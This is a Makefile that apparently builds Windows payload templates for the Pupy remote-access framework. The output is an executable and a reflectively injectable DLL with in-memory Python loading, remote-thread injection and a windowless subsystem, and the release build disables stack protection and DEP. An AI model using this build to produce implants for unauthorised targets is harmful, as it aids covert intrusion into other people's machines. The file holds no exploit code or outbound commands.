BUILDENV ?= $(PWD)/buildenv
BUILDENV_READY = $(BUILDENV)/.ready
PYTHONPATH := C:\\Python27

TEMPLATE_OUTPUT_PATH=../../pupy/payload_templates

ifndef ARCH
$(error You must specify an architecture - win64 or win32)
endif

CC := $(BUILDENV)/$(ARCH)/cl.sh
PYTHON := $(BUILDENV)/$(ARCH)/python.sh
HOST_PYTHON := python

ifeq "$(ARCH)" "win64"
CFLAGS:=$(CFLAGS) /DWIN_X64 /D_WIN64 /nologo
PPARCH := x64
else
CFLAGS:=$(CFLAGS) /DWIN_X86 /nologo
PPARCH := x86
endif

ifdef DEBUG
DEBUG_ADD   := -debug
CFLAGS      := $(CFLAGS) /DDEBUG /DVERBOSE
LINKER_OPTS := /NXCOMPAT:NO
PPARCH      := $(PPARCH)d
else
DEBUG_ADD   :=
LINKER_OPTS := /NXCOMPAT:NO /link /subsystem:windows /ENTRY:mainCRTStartup /LTCG
PPARCH      := $(PPARCH)
CFLAGS      := $(CFLAGS) /O1 /GL /GS-
endif

CFLAGS      := $(CFLAGS) /I..\\lzma

PYOBJS := \
	_memimporter.obj \
	MyLoadLibrary.obj \
	Python-dynload.obj \
	pupy_load.obj \
	pupy.obj \
	base_inject.obj

COMMON_OBJS := \
	MemoryModule.obj \
	actctx.obj list.obj thread.obj remote_thread.obj \
	LoadLibraryR.obj LzmaDec.obj

all: $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).exe $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).dll

$(BUILDENV_READY):
	./buildenv.sh "$(BUILDENV)"

revision.h:
	rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
	 echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@

pupy.c: resources_library_compressed_string_txt.c revision.h
pupy_load.c: resources_msvcr90_dll.c resources_python27_dll.c resources_bootloader_pyc.c revision.h

import-tab.c import-tab.h: mktab.py
	$(HOST_PYTHON) $(PFLAGS) $<

Python-dynload.obj: import-tab.c import-tab.h

resources/library_compressed_string.txt: ../gen_library_compressed_string.py resources/library.zip $(BUILDENV_READY)
	$(HOST_PYTHON) ../gen_library_compressed_string.py

resources/library.zip: ../build_library_zip.py $(BUILDENV_READY)
	$(PYTHON) ../build_library_zip.py -windows

resources_library_compressed_string_txt.c: ../gen_resource_header.py resources/library_compressed_string.txt resources/library.zip $(BUILDENV_READY)
	$(HOST_PYTHON) ../gen_resource_header.py resources/library_compressed_string.txt

resources/bootloader.pyc: ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py ../gen_python_bootloader.py $(BUILDENV_READY)
	$(PYTHON) ../gen_python_bootloader.py $(DEBUG_ADD)

resources_bootloader_pyc.c: resources/bootloader.pyc ../gen_resource_header.py $(BUILDENV_READY)
	$(HOST_PYTHON) ../gen_resource_header.py $<

resources/python27.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/python27.dll $(BUILDENV_READY)
	cp $< $@

resources/msvcr90.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/msvcr90.dll $(BUILDENV_READY)
	cp $< $@

resources_python27_dll.c: resources/python27.dll ../gen_resource_header.py $(BUILDENV_READY)
	$(HOST_PYTHON) ../gen_resource_header.py $<

resources_msvcr90_dll.c: resources/msvcr90.dll ../gen_resource_header.py $(BUILDENV_READY)
	$(HOST_PYTHON) ../gen_resource_header.py $<

$(PYOBJS): %.obj: %.c
	$(CC) /c $(CFLAGS) /I$(PYTHONPATH)\\include $<

LzmaDec.obj: ../lzma/LzmaDec.c
	$(CC) /c $(CFLAGS) $<

main_exe.obj: main_exe.c
	$(CC) /c $(CFLAGS) $<

%.obj: %.c
	$(CC) /c $(CFLAGS) $<

ReflectiveLoader.obj: ReflectiveLoader.c
	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN /DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $<

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).exe: main_exe.obj $(PYOBJS) $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)

$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).dll: main_reflective.obj $(PYOBJS) ReflectiveLoader.obj $(COMMON_OBJS)
	$(CC) $(CFLAGS) $+ /Fe$@ /LD

.PHONY: clean

clean:
	rm -f *.obj
	rm -f *.pyo
	rm -f *.pyc
	rm -f *_txt.c
	rm -f *_pyc.c
	rm -f *_dll.c
	rm -f revision.h
	rm -f import-tab.c
	rm -f import-tab.h
	rm -f resources/*.pyo
	rm -f resources/*.pyc
	rm -f resources/*.txt
	rm -f resources/*_txt.c
	rm -f resources/library.zip
	rm -f resources/python27.dll
	rm -f resources/msvcr90.dll
	rm -f $(PYOBJS) $(COMMON_OBJS)

$(COMMON_OBJS) $(PYOBJS): import-tab.h
